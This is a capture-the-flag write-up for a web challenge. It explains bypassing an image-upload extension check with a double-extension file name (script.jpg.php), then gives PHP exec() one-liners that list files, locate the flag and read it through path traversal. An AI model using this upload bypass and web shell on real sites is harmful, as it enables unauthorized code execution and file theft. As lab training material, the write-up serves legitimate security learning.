# Secure File Manager
## Web

> My friend insists that his file manager is 100% secure now.
> Except its no longer a file manager, just an image manager.
> Prove him wrong again!
>
> http://128.199.77.173:13002

### Files
- N/A

### Analysis
The website has an image upload but checks for the .php extension

### Solution
1. Similar to [Superior File Manager](https://github.com/mynamegabe/May-CTF-Writeups/edit/main/Web/Superior-File-Manager),<br />
   Upload a PHP script with a .png or .jpg extension anywhere in the file name. E.g. script.jpg.php
   ```php
   <?php echo exec("ls -la"); ?>
   ```
2. View the file after uploading
   The PHP file will be executed.
3. Accessing the flag
   ```php
   <?php echo exec("locate flag.txt"); ?>
   ```
4. Getting the flag
   ```php
   <?php echo exec("cat ../../../../../flag.txt"); ?>
   ```
